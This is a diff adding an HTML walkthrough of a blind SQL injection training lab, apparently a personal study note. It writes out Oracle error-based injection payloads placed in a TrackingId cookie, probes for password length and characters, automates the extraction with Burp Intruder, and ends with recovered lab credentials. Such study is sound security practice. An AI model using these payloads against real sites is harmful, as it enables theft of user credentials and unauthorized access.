@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Blind SQL injection with conditional errors</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>Blind SQL injection with conditional errors</h1><br/><p><ol><li>Provided with storefront website, told there is a table called users containing columns username and password, told to find password for user administrator and sign in</li><li>Intercepted page refresh on burpsuite and sent to Repeater</li><li>Appended ‘||(SELECT ’&#39;)||&#39; to cookie TrackingId and received error</li><li>Tried ‘|| (SELECT ’&#39; dual) ||&#39; and no error</li><li>Discovered database model is Oracle</li><li>Appended ‘|| (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual) ||&#39;</li><li>Resulted in no errors</li><li>Appended ‘|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||’</li><li>Resulted in error as expected</li><li>Appended ‘|| (SELECT CASE WHEN (LENGTH(password)&gt;1) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username = ’administrator&#39;)||&#39;</li><li>Recieved error meaning password has length longer than 1</li><li>Sent to Intruder, set positions around 1, set payload from 1-100, grepped error</li><li>Discovered password length is 20 characters: </li></ol><img src="images/307-1.png" alt="images/307-1.png" /><ol><li>Appended ‘|| (SELECT CASE WHEN (SUBSTR(password, 1, 1)=&#39;1&#39;) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username = ’administrator&#39;)||&#39;</li><li>Set positions around 1, pasted list 0-9 and a-z, grepped for Internal Server Error</li><li>Discovered first character of password is 7</li><li>Repeated 19 times</li><li>Discovered credentials “administrator:7vcpyylj044fafappmjy”</li><li>Logged in with credentials to complete lab successfully: </li></ol><img src="images/307-2.png" alt="images/307-2.png" /></p></div>
+</body>
+</html>
